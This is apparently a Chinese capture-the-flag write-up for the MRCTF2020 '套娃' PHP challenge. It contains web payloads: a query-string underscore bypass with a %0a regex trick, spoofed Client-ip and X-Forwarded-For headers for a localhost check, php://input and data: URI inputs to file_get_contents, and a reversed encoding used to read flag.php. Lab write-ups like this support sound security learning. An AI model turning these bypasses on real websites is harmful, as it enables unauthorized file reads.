# \[MRCTF2020]套娃

## \[MRCTF2020]套娃

## 考点

* PHP参数污染
* PHP的字符串解析特性
* JSFuck

## wp

F12看到源码

```php
//1st
$query = $_SERVER['QUERY_STRING'];

 if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
    die('Y0u are So cutE!');
}
 if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
    echo "you are going to the next ~";
}
```

`$_SERVER['QUERY_STRING']`是请求附带的参数，不能有`_`，但是后一段代码要求GET参数`b_u_p_t`，这是PHP的参数污染问题，用<mark style="color:orange;">`b[u[p[t`</mark>，发现不行，那还可以用<mark style="color:red;">`空格`</mark>或者<mark style="color:red;">`.`</mark>。又要求参数不等于23333，但是要和它长得一模一样，则可以使用%0a绕过`preg_match`

payload：`b u p t=23333%0a`

来到下一层`secrettw.php` ，F12看到一堆JSFuck编码，放到控制台执行，给了提示`post me Merak`

![](<../../.gitbook/assets/image (5) (1) (1) (1) (1).png>)

POST Merak可以得到源码

```php
<?php 
error_reporting(0); 
include 'takeip.php';
ini_set('open_basedir','.'); 
include 'flag.php';

if(isset($_POST['Merak'])){ 
    highlight_file(__FILE__); 
    die(); 
} 


function change($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}
echo 'Local access only!'."<br/>";
$ip = getIp();
if($ip!='127.0.0.1')
echo "Sorry,you don't have permission!  Your ip is :".$ip;
if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){
echo "Your REQUEST is:".change($_GET['file']);
echo file_get_contents(change($_GET['file'])); }
?>  
```

IP限制可以使用`Client-ip: 127.0.0.1`绕过，`file_get_contents($_GET['2333'])`可以使用`php://input`或者`data:text/plain,todat is a happy day`绕过，最后再反写`change`函数就可以了

`change`函数的加密逻辑就是 `C = P + 2x`，反过来不难写出解密逻辑

```php
function dechange($v){ 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) - $i*2 ); 
    } 
    return base64_encode($re); 
}
```

flag.php的密文为`ZmpdYSZmXGI=`

![](<../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png>)

## 小结

1. [利用PHP的字符串解析特性Bypass](https://www.freebuf.com/articles/web/213359.html)
2. 对于本地IP的绕过，可以使用`X-Forwarded-For`或者`Client-ip`
